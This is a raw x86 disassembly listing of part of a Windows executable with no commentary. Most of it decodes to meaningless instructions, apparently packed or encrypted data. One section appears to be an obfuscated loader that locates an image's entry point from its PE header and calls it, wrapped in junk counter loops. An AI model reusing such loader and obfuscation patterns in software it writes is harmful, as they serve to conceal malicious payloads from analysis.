  411040:	shl    DWORD PTR [edi+0x7e7e4f68],0x9d
  411047:	js     0x4110c7
  411049:	jle    0x411083
  41104b:	sub    BYTE PTR [eax+0x348a7fe2],al
  411051:	leave  
  411052:	gs or  esi,ecx
  411055:	fmul   QWORD PTR [esp+ebx*4+0x6c754857]
  41105c:	inc    ebp
  41105d:	push   0xe7570a4b
  411062:	xchg   ebp,eax
  411063:	sub    al,0xe6
  411065:	pop    ecx
  411066:	outs   dx,DWORD PTR ds:[esi]
  411067:	mov    edx,0xa6763c6b
  41106c:	(bad)  
  41106d:	or     al,0x16
  41106f:	leave  
  411070:	es loope 0x4110f2
  411073:	pop    ecx
  411074:	daa    
  411075:	xchg   edx,eax
  411076:	fild   WORD PTR [edx]
  411078:	cld    
  411079:	pop    ebp
  41107a:	sub    DWORD PTR [ebp-0x2d],0x48
  41107e:	sub    DWORD PTR [edx+0x57],edi
  411081:	mov    DWORD PTR [ebp+0x456b263c],esi
  411087:	test   eax,0xba5733b8
  41108c:	pop    eax
  41108d:	jnp    0x4110f3
  41108f:	daa    
  411090:	fs in  al,0xd1
  411093:	inc    eax
  411094:	jg     0x41110a
  411096:	enter  0xd2a5,0xe7
  41109a:	outs   dx,BYTE PTR ds:[esi]
  41109b:	push   ss
  41109c:	dec    eax
  41109d:	cmp    al,0xc7
  41109f:	mov    bl,0x6d
  4110a1:	adc    al,0x83
  4110a3:	inc    ecx
  4110a4:	repnz shl BYTE PTR [ebp+edi*8+0x76],0x2e
  4110aa:	lea    esp,[eax+ecx*4+0x31]
  4110ae:	icebp  
  4110af:	mov    esi,DWORD PTR [esp+edi*8+0x65263d49]
  4110b6:	pop    ecx
  4110b7:	addr16 pop ecx
  4110b9:	loope  0x4110a6
  4110bb:	mov    bl,BYTE PTR [edx-0x2d608bc3]
  4110c1:	inc    edi
  4110c2:	shl    esp,cl
  4110c4:	jb     0x41110b
  4110c6:	std    
  4110c7:	loope  0x41107e
  4110c9:	dec    esi
  4110ca:	or     eax,ebp
  4110cc:	sub    BYTE PTR [esi],ah
  4110ce:	popf   
  4110cf:	sub    esi,ebx
  4110d1:	daa    
  4110d2:	fbld   TBYTE PTR [edx+0xe]
  4110d5:	aad    0x21
  4110d7:	dec    ebp
  4110d8:	xchg   ebp,eax
  4110d9:	add    al,0x39
  4110db:	fstp   DWORD PTR [ebp-0x25]
  4110de:	(bad)  
  4110e0:	mov    esi,0x74b95db4
  4110e5:	inc    esi
  4110e6:	ins    BYTE PTR es:[edi],dx
  4110e7:	stos   DWORD PTR es:[edi],eax
  4110e8:	in     al,0x11
  4110ea:	sub    eax,DWORD PTR [edx+0x5d]
  4110ed:	sub    ebx,ecx
  4110ef:	push   ebx
  4110f0:	fiadd  WORD PTR [ebx+0xed3829d]
  4110f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110f7:	or     edx,DWORD PTR [edx-0x313b7c25]
  4110fd:	es inc ecx
  4110ff:	in     al,dx
  411100:	push   cs
  411101:	call   0x1926:0xfccad6a4
  411108:	mov    DWORD PTR [edx-0x73],ecx
  41110b:	mov    ebp,eax
  41110d:	leave  
  41110e:	mov    al,0x54
  411110:	pushf  
  411111:	mov    ebx,0x34cfcf7c
  411116:	xchg   esi,eax
  411117:	lds    eax,FWORD PTR [ecx-0x77b54c43]
  41111d:	adc    esp,0x494fca3a
  411123:	stos   BYTE PTR es:[edi],al
  411124:	cdq    
  411125:	test   al,0x64
  411127:	mov    esp,0xfb2b588f
  41112c:	sub    eax,0x61cf0232
  411131:	add    BYTE PTR [edi],bh
  411133:	fxtract 
  411135:	mov    bl,0x33
  411137:	mov    ah,dh
  411139:	(bad)  
  41113b:	cmp    al,0xe4
  41113d:	add    al,0xaf
  41113f:	daa    
  411140:	sahf   
  411141:	scas   al,BYTE PTR es:[edi]
  411142:	inc    ebp
  411143:	jp     0x411179
  411145:	dec    ecx
  411146:	adc    eax,0x1c62552e
  41114b:	push   0xf2d8a5b0
  411150:	xchg   esp,eax
  411151:	in     al,0xd
  411153:	inc    edi
  411154:	clc    
  411155:	dec    esp
  411156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411157:	cs jg  0x411150
  41115a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41115b:	push   esp
  41115c:	xchg   edi,eax
  41115d:	or     BYTE PTR [ecx-0x3d3824c4],ah
  411163:	or     BYTE PTR [ebp+ecx*1-0x22],al
  411167:	or     eax,0x7d4a7b7c
  41116c:	inc    eax
  41116d:	push   edi
  41116e:	or     eax,0x499da019
  411173:	sbb    bh,BYTE PTR [eax+0x7]
  411176:	pushf  
  411177:	aaa    
  411178:	out    0x33,eax
  41117a:	add    ebp,DWORD PTR [esi+0x440a504f]
  411180:	mov    ds:0xa98c2163,al
  411185:	jg     0x411136
  411187:	popf   
  411188:	push   ebp
  411189:	fst    QWORD PTR [di+0x22d8]
  41118e:	aad    0xcc
  411190:	mov    edi,DWORD PTR [ebp+0x7ba44f20]
  411196:	cld    
  411197:	cwde   
  411198:	mov    ebx,0x588081ba
  41119d:	gs mov dl,0xb9
  4111a0:	out    dx,al
  4111a1:	and    DWORD PTR [edx+0x38],0x2865deb9
  4111a8:	stos   BYTE PTR es:[edi],al
  4111a9:	aam    0x87
  4111ab:	ins    BYTE PTR es:[edi],dx
  4111ac:	inc    eax
  4111ad:	adc    DWORD PTR [ebp-0x7c],edx
  4111b0:	clc    
  4111b1:	jnp    0x4111a2
  4111b3:	imul   ebx,edi,0x34527b0a
  4111b9:	xor    DWORD PTR [edx-0x402e9404],edi
  4111bf:	arpl   WORD PTR [ebp+0x4e1719e7],bp
  4111c5:	mov    cl,0xc3
  4111c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c8:	out    dx,al
  4111c9:	sbb    ah,dh
  4111cb:	mov    ss,WORD PTR [ebp-0x27ec4ae2]
  4111d1:	add    BYTE PTR [eax-0x61316e8f],dh
  4111d7:	jo     0x41124d
  4111d9:	sbb    BYTE PTR [esi-0x5cd029ca],bl
  4111df:	shl    DWORD PTR [esi+0x27],1
  4111e2:	cdq    
  4111e3:	jg     0x41118c
  4111e5:	(bad)  
  4111e7:	(bad)  
  4111e8:	lea    ebx,[edi-0x64]
  4111eb:	jo     0x4111f3
  4111ed:	loop   0x411172
  4111ef:	js     0x411251
  4111f1:	aas    
  4111f2:	mov    ebx,0x6142551a
  4111f7:	pop    esp
  4111f8:	es (bad) 
  4111fa:	xchg   ebp,eax
  4111fb:	out    dx,eax
  4111fc:	not    BYTE PTR [eax+esi*2-0x42761fdc]
  411203:	(bad)  [eax-0x51530d65]
  411209:	push   0xffffffde
  41120b:	stos   BYTE PTR es:[edi],al
  41120c:	sub    dl,BYTE PTR [ecx-0x32]
  41120f:	mov    cx,0x9b36
  411213:	mov    eax,ds:0x63ef7558
  411218:	cli    
  411219:	call   0x4afe:0xb95ccc38
  411220:	aam    0xa8
  411222:	push   cs
  411223:	cmp    eax,0x9045cea3
  411228:	dec    esi
  411229:	mov    WORD PTR [esi-0x2b7c6d0e],cs
  41122f:	int3   
  411230:	stc    
  411231:	jnp    0x41125c
  411233:	fstp   st(0)
  411235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411236:	out    0xd1,eax
  411238:	je     0x4111da
  41123a:	sub    ch,BYTE PTR [ebx+0x32]
  41123d:	test   al,0x51
  41123f:	fisttp WORD PTR [esi+ebp*8]
  411242:	bound  ebx,QWORD PTR [edi+0xb]
  411245:	hlt    
  411246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411247:	xlat   BYTE PTR ds:[ebx]
  411248:	add    BYTE PTR [ebx+0x426ea024],al
  41124e:	sar    BYTE PTR [eax+0x16de99cd],0x9a
  411255:	xor    bl,BYTE PTR [edx-0x36e25367]
  41125b:	mov    ds:0x6a0338fe,eax
  411260:	mov    cl,0x64
  411262:	or     eax,0x635a366a
  411267:	pushf  
  411268:	jns    0x41127f
  41126a:	aam    0xfb
  41126c:	out    0x1e,al
  41126e:	dec    esi
  41126f:	sub    al,al
  411271:	push   0x37
  411273:	inc    eax
  411274:	stc    
  411275:	mov    ebx,0xdb61f6b5
  41127a:	xchg   esp,eax
  41127b:	xor    ebp,DWORD PTR [edi+0x1e]
  41127e:	sub    DWORD PTR [edi],edi
  411280:	(bad)  
  411281:	fst    QWORD PTR [eax-0x4d543e45]
  411287:	push   ds
  411288:	popa   
  411289:	scas   eax,DWORD PTR es:[edi]
  41128a:	mov    edx,0xaa3865d1
  41128f:	push   ecx
  411290:	dec    eax
  411291:	(bad)
  411294:	sbb    al,0x2
  411296:	cmp    ebp,esp
  411298:	add    BYTE PTR ds:0x1cd43145,al
  41129e:	scas   eax,DWORD PTR es:[edi]
  41129f:	jp     0x411263
  4112a1:	push   es
  4112a2:	out    0x20,al
  4112a4:	sub    BYTE PTR [ecx+0x4e],ch
  4112a7:	mov    cl,0x44
  4112a9:	or     eax,0xcf4b784d
  4112ae:	push   ecx
  4112af:	in     eax,dx
  4112b0:	(bad)  
  4112b1:	shl    BYTE PTR [edx-0x15],cl
  4112b4:	stc    
  4112b5:	jmp    0x64355ad5
  4112ba:	push   eax
  4112bb:	sar    DWORD PTR [esi-0x4ac7dd17],0x4f
  4112c2:	loopne 0x4112e7
  4112c4:	(bad)
  4112c8:	mov    dl,0x68
  4112ca:	lods   eax,DWORD PTR ds:[esi]
  4112cb:	or     ecx,DWORD PTR ds:0xa1288672
  4112d1:	dec    eax
  4112d2:	rcr    dl,1
  4112d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112d5:	fcom   QWORD PTR [ebp-0x2]
  4112d8:	inc    bh
  4112da:	xlat   BYTE PTR ds:[ebx]
  4112db:	and    al,0x4f
  4112dd:	sysenter 
  4112df:	loop   0x4112e4
  4112e1:	mov    edx,0x1acab14
  4112e6:	ud1    edi,DWORD PTR [ebp-0x7d740fcd]
  4112ed:	xchg   esp,eax
  4112ee:	add    DWORD PTR [eax],eax
  4112f0:	add    BYTE PTR [ebx+0x3c418b08],cl
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434683
  411346:	xor    DWORD PTR ds:0x43464f,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x43457f,0x14
  41135d:	cmp    DWORD PTR ds:0x43457f,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x43457f,0x3
  411371:	jne    0x411387
  411377:	push   0x4347fa
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x43457f,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x43457f
  411399:	dec    eax
  41139a:	mov    ds:0x43457f,eax
  41139f:	mov    eax,ds:0x43457f
  4113a4:	dec    eax
  4113a5:	mov    ds:0x43457f,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x43456f,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x4345c3,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x4345c3
  4113d0:	inc    eax
  4113d1:	mov    ds:0x4345c3,eax
  4113d6:	cmp    DWORD PTR ds:0x4345c3,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x4345c3,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x4345ff
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x4345c3,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x4345c3
  411418:	inc    eax
  411419:	mov    ds:0x4345c3,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43468f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43468f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43468f,ebx
  411442:	cmp    DWORD PTR ds:0x43468f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434613
  411457:	push   0x43475b
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43468f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43468f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43468f,ebx
  41147c:	cmp    DWORD PTR ds:0x43468f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x43455f
  411490:	adc    DWORD PTR ds:0x434647,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434603,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434683,0x434567
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x434653,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x434677,0x434573
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x43464b,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x43457f,0x4345bf
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434693,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x43457f,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x43457f
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x43457f,edi
  411509:	cmp    DWORD PTR ds:0x43457f,0xb
  411510:	jne    0x411529
  411516:	push   0x434687
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x43457f,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x43457f
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x43457f,edi
  411545:	cmp    DWORD PTR ds:0x43457f,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x434567,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x434577,0x1a
  411569:	cmp    DWORD PTR ds:0x434577,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x434577,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x434577,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x434577
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x434577,edi
  4115ac:	mov    edi,DWORD PTR ds:0x434577
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x434577,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x43456b
  4115c4:	adc    DWORD PTR ds:0x434563,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43468b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43468b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43468b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43468b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43468b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43468b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43468b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43468b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x4115fb
  411641:	iret   
  411642:	(bad)  
  411643:	and    eax,0x7e7e4a8f
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x411600
  41164d:	xor    al,0x3d
  41164f:	aad    0x12
  411651:	jb     0x41161f
  411653:	xchg   ebp,eax
  411654:	jle    0x4116ce
  411656:	std    
  411657:	or     DWORD PTR [edi],ebx
  411659:	jmp    0xeb022317
  41165e:	leave  
  41165f:	mov    ebp,0x91bad865
  411664:	or     ah,bh
  411666:	mov    dl,0xe7
  411668:	and    al,0xf
  41166a:	mov    eax,ds:0xd1e8cdc3
  41166f:	mov    ebx,0xdc571ab9
  411674:	stc    
  411675:	sub    al,0x8a
  411677:	shr    DWORD PTR [ebp-0x6c],1
  41167a:	call   0xf3576153
  41167f:	or     BYTE PTR [ebx+ebx*1-0x36],ah
  411683:	into   
  411684:	jbe    0x4116fa
  411686:	sbb    dh,BYTE PTR [edi+0x58]
  411689:	fld    QWORD PTR [edi]
  41168b:	inc    cx
  41168d:	leave  
  41168e:	and    BYTE PTR [esi+ecx*8+0x4c],dh
  411692:	(bad)  
  411693:	fst    DWORD PTR [eax]
  411695:	or     bl,BYTE PTR [ebp+0x28230b0f]
  41169b:	cmp    DWORD PTR [ebx],ebp
  41169d:	inc    edi
  41169e:	sbb    edi,DWORD PTR [edi+0x65]
  4116a1:	sub    DWORD PTR [edx-0x11],edx
  4116a4:	mov    edi,edx
  4116a6:	enter  0xb7dd,0x71
  4116aa:	push   eax
  4116ab:	sar    DWORD PTR [edi-0x45ecb3de],1
  4116b1:	sbb    eax,DWORD PTR [edi-0xaf2f194]
  4116b7:	cdq    
  4116b8:	and    esp,DWORD PTR [eax+0x6ed9362d]
  4116be:	mov    esi,0xd5237cbc
  4116c3:	xor    al,0x9e
  4116c5:	adc    DWORD PTR [ebp-0xc],edx
  4116c8:	sub    BYTE PTR [esi],dl
  4116ca:	sbb    eax,0x8c3c9df8
  4116cf:	popa   
  4116d0:	scas   eax,DWORD PTR es:[edi]
  4116d1:	iret   
  4116d2:	addr16 adc al,0xb1
  4116d5:	fisttp DWORD PTR [edx+0x569fc567]
  4116db:	push   esp
  4116dc:	adc    ecx,ebp
  4116de:	mov    ds:0x8ab4d467,eax
  4116e3:	bound  ebp,QWORD PTR [ecx+0x18f01302]
  4116e9:	pop    ebx
  4116ea:	mov    ah,BYTE PTR [edx]
  4116ec:	adc    ebp,DWORD PTR [edi]
  4116ee:	inc    eax
  4116ef:	mov    ebx,DWORD PTR [ebx-0x4d]
  4116f2:	xchg   edi,eax
  4116f3:	popa   
  4116f4:	ins    DWORD PTR es:[edi],dx
  4116f5:	add    BYTE PTR [ecx],bl
  4116f7:	inc    edi
  4116f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116f9:	lds    ebp,FWORD PTR [esi-0x22bff7c8]
  4116ff:	cmp    DWORD PTR [ecx+0x5d],edi
  411702:	repz iret 
  411704:	cwde   
  411705:	fs mov eax,0xddf4d5
  41170b:	ret    0x5f6
  41170e:	xor    eax,0x233af901
  411713:	cs dec edi
  411715:	sbb    dh,BYTE PTR [esi+0x43]
  411718:	(bad)  
  411719:	mov    cl,0x5f
  41171b:	sbb    DWORD PTR [esi+ebp*4+0x1aeacf71],esp
  411722:	mov    edi,0x3b3283d9
  411727:	xor    al,0x18
  411729:	jg     0x4116e5
  41172b:	jbe    0x41171d
  41172d:	ror    DWORD PTR [esi],1
  41172f:	or     BYTE PTR [ecx+0x15b1f791],bl
  411735:	pop    edx
  411736:	mov    edx,0x39ef495c
  41173b:	xor    DWORD PTR [ecx+eax*4],0xc4960295
  411742:	test   al,0x7b
  411744:	cmc    
  411745:	fisttp DWORD PTR [ebp+0x62177181]
  41174b:	lea    edx,[ebx-0x22]
  41174e:	shl    BYTE PTR [ebp+0x98e96a1],0xd0
  411755:	sub    edi,DWORD PTR [eax]
  411757:	scas   al,BYTE PTR es:[edi]
  411758:	popa   
  411759:	test   BYTE PTR [eiz*1-0x4080c5bb],0xdb
  411761:	cmp    eax,0xe38ff7b2
  411766:	dec    ebx
  411767:	addr16 mov ds:0x5515,al
  41176b:	sahf   
  41176c:	xor    DWORD PTR [eax-0x3a06612c],ebx
  411772:	popf   
  411773:	push   ebx
  411774:	inc    edi
  411775:	push   eax
  411776:	pop    es
  411777:	pop    esp
  411778:	aaa    
  411779:	dec    esp
  41177a:	retf   
  41177b:	push   edi
  41177c:	arpl   WORD PTR [ebx-0x7],di
  41177f:	push   esi
  411780:	dec    ecx
  411781:	pop    ebp
  411782:	fsubr  QWORD PTR [esp+ebp*4-0x2ae69ca8]
  411789:	fld    st(5)
  41178b:	sbb    DWORD PTR [ecx+0x67],ecx
  41178e:	add    BYTE PTR [ecx+0x26fc9e7a],dl
  411794:	and    ecx,DWORD PTR ds:0x2cea82c9
  41179a:	dec    ecx
  41179b:	jp     0x4117ee
  41179d:	fdivp  st(4),st
  41179f:	sub    BYTE PTR [edi],bl
  4117a1:	and    edx,ebp
  4117a3:	out    0xfd,eax
  4117a5:	or     edx,0x874c08e7
  4117ab:	push   0x6a
  4117ad:	es xchg ecx,eax
  4117af:	mov    ebp,0xda545aaf
  4117b4:	add    eax,0x4fa58d2b
  4117b9:	cmp    eax,0x95a6322d
  4117be:	pop    ecx
  4117bf:	xor    DWORD PTR [esi-0x7d],ebp
  4117c2:	xchg   bl,cl
  4117c4:	and    BYTE PTR [eax+0x69695ca0],cl
  4117ca:	xor    ecx,eax
  4117cc:	cmp    al,0xb4
  4117ce:	or     dl,BYTE PTR [ebp+0x3b29a944]
  4117d4:	int3   
  4117d5:	sbb    DWORD PTR [ecx],0xffffffdf
  4117d8:	mov    dh,dl
  4117da:	mov    ah,BYTE PTR [eax-0x34d91351]
  4117e0:	jb     0x411825
  4117e2:	pop    eax
  4117e3:	fsubrp st(4),st
  4117e5:	sbb    DWORD PTR [edi+eax*8-0x315337c1],ecx
  4117ec:	jns    0x411844
  4117ee:	mov    ebx,ds
  4117f0:	fcmovnbe st,st(3)
  4117f2:	shl    BYTE PTR [esi],1
  4117f4:	jno    0x411779
  4117f6:	shl    dl,cl
  4117f8:	mov    dl,0xa8
  4117fa:	lahf   
  4117fb:	sub    cl,bl
  4117fd:	push   edx
  4117fe:	aaa    
  4117ff:	popa   
  411800:	xor    ebx,ebp
  411802:	ins    BYTE PTR es:[edi],dx
  411803:	push   0xffffff85
  411805:	int    0xbf
  411807:	pushf  
  411808:	xchg   DWORD PTR [edx],edi
  41180a:	(bad)  
  41180b:	stc    
  41180c:	fwait
  41180d:	jmp    0xaca1:0x77a32a0b
  411814:	sub    bl,BYTE PTR es:[edi-0x11]
  411818:	(bad)  
  411819:	push   cs
  41181a:	cmp    bl,ah
  41181c:	cli    
  41181d:	dec    ebp
  41181e:	jnp    0x411833
  411820:	test   eax,0xa42bb6a0
  411825:	in     al,dx
  411826:	(bad)  [ebx-0x554b6b1b]
  41182c:	repz pop ss
  41182e:	in     eax,0xbe
  411830:	jns    0x4118aa
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	fist   WORD PTR [ebp-0x60]
  411853:	aaa    
  411854:	jmp    0x7e7f:0x597e7e54
  41185b:	jle    0x411830
  41185d:	push   ecx
  41185e:	iret   
  41185f:	inc    cx
  411861:	sub    dh,BYTE PTR [edx-0x2a2d31b7]
  411867:	cld    
  411868:	(bad)  
  41186a:	sbb    al,0xce
  41186c:	dec    edx
  41186d:	adc    bh,ah
  41186f:	ror    DWORD PTR [esi],1
  411871:	pushf  
  411872:	and    DWORD PTR cs:[ecx+0x242577db],edx
  411879:	mov    ebx,0x118a711d
  41187e:	dec    esp
  41187f:	loop   0x41183e
  411881:	jp     0x41180a
  411883:	imul   BYTE PTR [eax]
  411885:	mov    al,0xb0
  411887:	stc    
  411888:	mov    ebx,0x7a82f717
  41188d:	jno    0x4118c3
  41188f:	xchg   ebx,eax
  411890:	xor    dh,bh
  411892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411893:	mov    bl,BYTE PTR [esi-0x77c2e8f3]
  411899:	mov    bh,0x7a
  41189b:	nop
  41189c:	dec    ebp
  41189d:	or     DWORD PTR [edx],edi
  41189f:	push   ds
  4118a0:	mov    al,0x9e
  4118a2:	inc    ebp
  4118a3:	sahf   
  4118a4:	push   0x664fd35f
  4118a9:	mov    al,0xb8
  4118ab:	mov    ebx,0x4f683bb4
  4118b0:	fimul  WORD PTR [edi]
  4118b2:	scas   al,BYTE PTR es:[edi]
  4118b3:	mov    ebx,0x717568b8
  4118b8:	adc    ebx,DWORD PTR [ebp+0x76]
  4118bb:	aas    
  4118bc:	and    eax,0xc44bc21
  4118c1:	enter  0xa9ed,0x7f
  4118c5:	push   cs
  4118c6:	ret    
  4118c7:	jle    0x41187b
  4118c9:	jno    0x411938
  4118cb:	pop    ecx
  4118cc:	ret    0x3698
  4118cf:	sub    al,ah
  4118d1:	daa    
  4118d2:	out    dx,eax
  4118d3:	xor    ebp,DWORD PTR [edx-0x17da3b4f]
  4118d9:	cmp    ebp,0xfd227ac3
  4118df:	fimul  WORD PTR [edx-0x2e3ba20c]
  4118e5:	hlt    
  4118e6:	fadd   QWORD PTR [esi+0x23015110]
  4118ec:	cmp    al,dl
  4118ee:	mov    eax,ds:0x4db04a45
  4118f3:	jl     0x411883
  4118f5:	popa   
  4118f6:	je     0x411974
  4118f8:	data16 sbb cl,BYTE PTR [esi+0x17]
  4118fc:	repz jb 0x4118f9
  4118ff:	das    
  411900:	pusha  
  411901:	in     al,dx
  411902:	push   edi
  411903:	jbe    0x41190a
  411905:	lock add eax,0xadc7bdf1
  41190b:	out    0x46,al
  41190d:	int    0x72
  41190f:	adc    BYTE PTR [ebp+esi*2-0x31b0ac2a],ah
  411916:	js     0x411969
  411918:	mov    edi,0x82cc0787
  41191d:	xchg   ebx,eax
  41191e:	out    0x27,eax
  411920:	add    eax,0x3ab069b7
  411925:	iret   
  411926:	xchg   ebp,eax
  411927:	jo     0x411936
  411929:	ins    BYTE PTR es:[edi],dx
  41192a:	ds in  al,0xd3
  41192d:	sahf   
  41192e:	and    bh,bl
  411930:	into   
  411931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411932:	add    al,0xb8
  411935:	popf   
  411936:	mov    al,ds:0x5a162eda
  41193b:	or     DWORD PTR [edi-0x5fe9fd23],0xffffffb6
  411942:	adc    esp,DWORD PTR [ecx+esi*8-0x2883b4b9]
  411949:	in     al,0x15
  41194b:	xor    BYTE PTR [eax+0x30],dl
  41194e:	in     eax,dx
  41194f:	arpl   dx,cx
  411951:	aad    0x3c
  411953:	push   cs
  411954:	xchg   BYTE PTR [ebp+0x53],al
  411957:	(bad)  
  411959:	push   eax
  41195a:	xchg   ebx,eax
  41195b:	mov    DWORD PTR [edx],edx
  41195d:	inc    ebp
  41195e:	daa    
  41195f:	adc    bl,BYTE PTR [eax-0x38101268]
  411965:	lahf   
  411966:	(bad)  
  411967:	enter  0x6261,0x9b
  41196b:	repz gs dec ecx
  41196e:	mov    eax,0x608d08f
  411973:	out    0xe8,al
  411975:	imul   ecx,DWORD PTR [eax-0x72],0xf7029bd9
  41197c:	(bad)  
  41197d:	pop    ebp
  41197e:	je     0x4119ac
  411980:	dec    edx
  411981:	mov    esi,DWORD PTR [edx+esi*1]
  411984:	in     al,0xea
  411986:	mov    ds:0xc0224e09,al
  41198b:	test   eax,0xeacd6e57
  411990:	sub    eax,0xd26f044b
  411995:	add    eax,0x69860f15
  41199a:	xchg   ecx,eax
  41199b:	push   eax
  41199c:	icebp  
  41199d:	fcom   QWORD PTR [edi-0x15b31bc2]
  4119a3:	jo     0x41195a
  4119a5:	shl    BYTE PTR [edx],0xc
  4119a8:	sbb    al,0x38
  4119aa:	push   0xfffffffe
  4119ac:	ins    DWORD PTR es:[edi],dx
